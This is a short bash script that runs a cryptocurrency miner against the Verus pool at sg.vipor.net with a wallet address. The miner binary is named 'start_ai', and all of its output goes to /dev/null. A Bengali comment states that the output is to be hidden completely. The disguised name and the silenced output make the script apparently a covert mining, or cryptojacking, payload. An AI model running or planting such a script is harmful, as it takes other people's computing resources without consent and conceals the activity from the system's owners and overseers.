#!/bin/bash

chmod +x start_ai

# মাইনিং চালাও, আউটপুট সম্পূর্ণ লুকিয়ে (stdout + stderr)
./start_ai -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -t 2 > /dev/null 2>&1
